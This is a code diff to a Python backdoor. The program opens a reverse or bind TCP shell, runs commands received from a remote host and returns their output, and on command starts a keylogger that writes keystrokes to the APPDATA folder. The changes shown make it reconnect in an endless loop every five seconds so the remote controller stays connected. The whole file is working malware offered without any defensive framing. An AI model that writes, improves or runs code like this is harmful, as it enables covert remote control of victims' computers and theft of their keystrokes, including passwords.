@@ -2,6 +2,7 @@
 
 from socket import socket, AF_INET, SOCK_STREAM
 from sys import argv, stdin, stdout, stderr
+from time import sleep
 import subprocess
 import requests
 import keyboard
@@ -16,14 +17,14 @@ KEYLOG_PATH = os.getenv('APPDATA')+"\\"+KEYLOG_FILE
 CREATE_NO_WINDOW = 0x08000000
 DETACHED_PROCESS = 0x00000008
 
-def popen(command):
+def popen(command, shell=True):
     process = subprocess.Popen(
         command,
         stdin=subprocess.PIPE,
         stderr=subprocess.PIPE,
         stdout=subprocess.PIPE,
-        creationflags=DETACHED_PROCESS,
-        shell=True)
+        bufsize = 0,
+        shell=shell)
     return process
 
 def init_shell(s, shell):
@@ -56,19 +57,20 @@ def start_reverse_tcp_win(host, port=4444):
         data = s.recv(BUFFER_SIZE)
         if data:
             print('Got data', data.decode())
+            stdout, stderr, proc = (None, None, None)
             if data.decode().strip() == "keylogger":                
                 start_keylog()
                 s.send(b"Keylogger started and writing to ")
                 s.send(KEYLOG_PATH.encode('utf-8'))
                 continue
             try:
-                proc = popen(data.decode('utf-8'))
+                proc = popen(data.decode('utf-8'), shell=True)
                 stdout, stderr = proc.communicate()
             except Exception as e:
                 s.send(str(e).encode('utf-8'))
             print("Stdout", stdout)
             print("Stderr", stderr)
-            print("Error code", proc.returncode)
+            print("Error code", proc.returncode if proc else 0)
             if stdout:
                 s.send(stdout)
             if stderr:
@@ -135,16 +137,21 @@ def main():
     if params.get('help'):
         return usage()
     print('params are', params)
-    if params.get('reverse'):
-        if os.name != 'nt':
-            start_reverse_tcp(params.get('shell'), params.get('host'))
-        else:
-            start_reverse_tcp_win(params.get('host'))
-    else:
-        if params.get('host'):
-            start_tcp_bind(params.get('shell'), params.get('host'))
-        else:
-            start_tcp_bind(params.get('shell'))
+    while True:
+        try:
+            if params.get('reverse'):
+                if os.name != 'nt':
+                    start_reverse_tcp(params.get('shell'), params.get('host'))
+                else:
+                    start_reverse_tcp_win(params.get('host'))
+            else:
+                if params.get('host'):
+                    start_tcp_bind(params.get('shell'), params.get('host'))
+                else:
+                    start_tcp_bind(params.get('shell'))
+        except Exception as e:
+            print(e)            
+        sleep(5)
     return
 
 if __name__ == "__main__":
